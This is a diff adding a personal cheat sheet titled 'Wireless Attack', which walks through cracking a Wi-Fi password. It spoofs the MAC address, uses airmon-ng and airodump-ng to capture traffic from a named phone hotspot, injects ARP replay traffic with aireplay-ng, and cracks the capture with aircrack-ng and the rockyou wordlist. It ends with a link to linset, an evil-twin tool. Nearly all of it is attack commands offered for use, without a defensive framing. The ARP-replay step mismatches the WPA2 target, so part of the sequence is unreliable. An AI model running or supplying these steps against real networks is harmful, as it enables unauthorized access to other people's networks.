@@ -1,0 +1,91 @@
+ Wireless Attack
+````````````````````````````````
+# ifconfig down wlan0
+# macchanger -r wlan0
+# ifconfig up wlan0
+
+
+
+1) check wireless adapter
+
+	# iwconfig
+
+MODE: managed
+MODE: monitor
+
+wlan0     IEEE 802.11  ESSID:off/any
+          Mode:Managed  
+
+2) Put the Wireless Adapter into Monitor Mode
+
+	# airmon-ng start wlan0
+
+wlan0     - Mode:Monitor
+
+3) Start Capturing Traffic [check]
+
+BSSID: Base Station [Prob Req]-[Beacon]
+SSID: Host
+
+	# airodump-ng wlan0
+
+BSSID			: 8A:8A:A0:40:E6:39
+CH				: 8
+WiFi Enc	: WPA2 CCMP   PSK  
+WiFi Name	: OnePlus Nord2 5G
+
+
+
+
+
+
+
+
+
+4) Start a Specific Capture on the AP
+
+	- copy BSSID, SSID
+
+	# airodump-ng --bssid 8A:8A:A0:40:E6:39 -c 8 -w demo wlan0
+
+
+5) Inject ARP Traffic
+
+ # aireplay-ng -3 -b 8A:8A:A0:40:E6:39 -h 82:2B:DF:6C:51:21 wlan0
+
+
+
+
+
+
+
+
+
+
+
+
+6) Crack the Password
+
+
+	# cd /usr/share/wordlists/
+
+	# gunzip rockyou.txt.gz
+	
+	# aircrack-ng -w /usr/share/wordlists/rockyou.txt demo-02.cap
+
+
+
+
+
+
+
+
+
+
+
+
+_____________
+
+Evil twin:
+----------
+linset: https://github.com/vk496/linset/blob/master/linset
